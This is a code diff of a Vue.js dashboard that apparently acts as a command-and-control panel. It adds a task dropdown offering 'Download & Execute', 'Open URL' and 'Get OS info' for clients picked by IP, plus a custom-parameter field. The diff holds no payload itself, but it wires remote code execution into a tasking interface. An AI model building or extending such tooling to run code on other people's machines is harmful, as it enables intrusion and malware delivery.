@@ -40,10 +40,15 @@
             label="Select Client"
             required
           ></v-select>
-          <v-text-field
+          <v-select
             v-model="newTask.task"
-            label="Task"
+            :items="predefinedTasks"
+            label="Select Task"
             required
+          ></v-select>
+          <v-text-field
+            v-model="newTask.additionalText"
+            label="Custom parameter"
           ></v-text-field>
           <v-btn type="submit" color="primary">Send</v-btn>
         </v-form>
@@ -84,18 +89,20 @@ const headers = [
 const tasks = ref([]);
 const clients = ref([]);
 const selectedClient = ref(null);
-const newTask = ref({ task: "" });
+const newTask = ref({ task: "", additionalText: "" });
+const predefinedTasks = ref(["Open URL", "Download & Execute", "Get OS info"]);
 const dialog = ref(false);
 const taskOutput = ref("");
 const alertMessage = ref("");
 const alertType = ref("success");
-
 let ws;
+
 onMounted(() => {
   fetchTasks();
   fetchClients();
   setupWebSocket();
 });
+
 function setupWebSocket() {
   ws = new WebSocket("ws://localhost:80");
   ws.onmessage = (event) => {
@@ -159,6 +166,7 @@ function sendTask() {
     const task = {
       ip: selectedClient.value,
       task: newTask.value.task,
+      additionalText: newTask.value.additionalText,
       status: "Pending",
     };
     axios
@@ -166,6 +174,7 @@ function sendTask() {
       .then(() => {
         fetchTasks();
         newTask.value.task = "";
+        newTask.value.additionalText = "";
         selectedClient.value = null;
       })
       .catch((error) => {
@@ -202,6 +211,7 @@ function viewTaskOutput(id) {
       alertType.value = "error";
     });
 }
+
 onUnmounted(() => {
   if (ws) {
     ws.close();
